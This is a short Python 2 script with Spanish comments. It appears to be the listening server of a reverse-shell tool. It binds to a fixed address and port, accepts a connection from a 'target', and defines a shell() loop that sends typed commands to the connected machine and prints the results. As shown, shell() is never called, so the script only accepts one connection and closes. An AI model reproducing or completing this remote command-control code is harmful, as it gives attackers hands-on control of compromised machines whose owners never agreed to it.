#!/usr/bin/env python
#_*_ coding: utf-8 _*_

import socket #importa módulo de socket

def shell():
	current_dir = target.recv(1024)
	while True:
		comando = raw_input("{}~#: ".format(current_dir))
		if comando == "exit":
			target.send(comando)
			break
		else:
			target.send(comando)
			res = target.recv(1024)
			print(res)

def upserver():		#función para levantar el servidor y 
	global server	#definir 3 variables globales que se puedan usar fuera de la función
	global ip 		#Tupla que contendrá la IP y puerto para la conexión.
	global target	#Objeto de la conexión, con el que vamos a interactuar, como recibir o mandar datos.

	#Crea un objeto del módulo socket utilizando la variable server. Entre paréntesis definimos la familia de sockets que usaremos
	server=socket.socket(socket.AF_INET, socket.SOCK_STREAM) #AF_INET para trabajar con IPv4, SOCK_STREAM para puertos TCP
	server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #Le dice al servidor que la dirección y puerto pueden volver a ser usados. 1 es para habilitar.
	server.bind(('192.168.1.68', 7777)) #Pone el servidor a la escucha.
	server.listen(1) #Pone el servidor a la escucha con 1 única conexión posible.

	print("Servidor corriendo. Esperando conexiones...")

	target, ip = server.accept() #De esta manera aceptamos CUALQUIER conexión posible que intente conectarse a nosotros.
	print("Conexión recibida de: " + str(ip[0])) #IP es una lista de datos la cual contendrá dirección IP y puerto.

upserver() #Llamamos a la función
server.close() #Cerramos el servidor.

